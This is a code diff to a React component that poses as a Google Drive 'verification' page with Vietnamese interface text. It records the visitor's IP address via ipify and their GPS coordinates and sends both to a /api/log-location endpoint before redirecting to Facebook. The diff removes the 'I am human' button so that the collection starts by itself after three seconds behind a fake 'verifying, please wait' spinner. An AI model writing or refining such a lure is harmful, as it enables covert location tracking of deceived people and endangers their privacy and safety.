@@ -1,4 +1,3 @@
-
 'use client';
 
 import { useEffect } from 'react';
@@ -20,39 +19,39 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     footerText, 
     redirectUrl,
     previewImageUrl,
-    customHtml,
   } = config;
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
-  const handleVerify = () => {
-    const requestLocation = async () => {
-      let clientIp = 'N/A';
-      try {
-          const ipResponse = await fetch('https://api.ipify.org?format=json');
-          if (ipResponse.ok) {
-              const ipData = await ipResponse.json();
-              clientIp = ipData.ip;
-          }
-      } catch(e) {
-          console.error("Could not fetch IP", e);
-      }
+  useEffect(() => {
+    const handleVerify = () => {
+      const requestLocation = async () => {
+        let clientIp = 'N/A';
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                clientIp = ipData.ip;
+            }
+        } catch(e) {
+            console.error("Could not fetch IP", e);
+        }
 
-      const logData = (pos?: GeolocationPosition) => {
-          const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
-          if (pos) {
-              body.lat = pos.coords.latitude;
-              body.lon = pos.coords.longitude;
-              body.acc = pos.coords.accuracy;
-          }
+        const logData = (pos?: GeolocationPosition) => {
+            const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
+            if (pos) {
+                body.lat = pos.coords.latitude;
+                body.lon = pos.coords.longitude;
+                body.acc = pos.coords.accuracy;
+            }
 
-          fetch('/api/log-location', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(body),
-          }).finally(() => {
-              window.location.href = REDIRECT_URL;
-          });
+            fetch('/api/log-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body),
+            }).finally(() => {
+                window.location.href = REDIRECT_URL;
+            });
       }
 
       if (navigator.geolocation) {
@@ -68,6 +67,13 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     
     requestLocation();
   };
+  
+    const timer = setTimeout(() => {
+      handleVerify();
+    }, 3000);
+
+    return () => clearTimeout(timer);
+  }, [REDIRECT_URL]);
 
   return (
     <div className="flex justify-center items-center min-h-screen bg-muted/30 p-4">
@@ -96,19 +102,12 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
             </div>
           </div>
           
-          {customHtml && (
-             <div 
-                className="prose prose-sm text-foreground text-left w-full mb-6"
-                dangerouslySetInnerHTML={{ __html: customHtml }} 
-             />
-          )}
-
-          <button
-            onClick={handleVerify}
-            className="w-full h-12 text-base font-semibold bg-primary text-primary-foreground rounded-lg flex items-center justify-center transition-colors hover:bg-primary/90"
+          <div
+            className="w-full h-12 text-base font-semibold bg-primary text-primary-foreground rounded-lg flex items-center justify-center transition-colors"
           >
-            Tôi là con người (đồng ý)
-          </button>
+            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+            Đang xác minh, vui lòng chờ...
+          </div>
 
           <div className="text-xs text-muted-foreground/80 mt-6">
             {footerText}
